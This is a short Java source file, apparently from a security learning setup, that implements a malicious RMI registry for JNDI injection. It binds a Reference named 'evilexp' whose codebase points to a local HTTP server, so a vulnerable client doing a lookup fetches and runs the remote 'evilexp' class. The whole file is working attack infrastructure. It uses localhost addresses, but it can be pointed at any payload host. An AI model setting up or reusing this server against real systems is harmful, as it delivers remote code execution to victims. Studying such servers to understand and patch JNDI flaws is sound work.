package cmisl;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMIServer {
    void register() throws Exception{
        LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("evilexp","evilexp","http://127.0.0.1:9999/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference);
        Naming.bind("rmi://127.0.0.1:1099/evilexp",refObjWrapper);
        System.out.println("Registry运行中......");
    }

    public static void main(String[] args) throws Exception {
        new RMIServer().register();
    }
}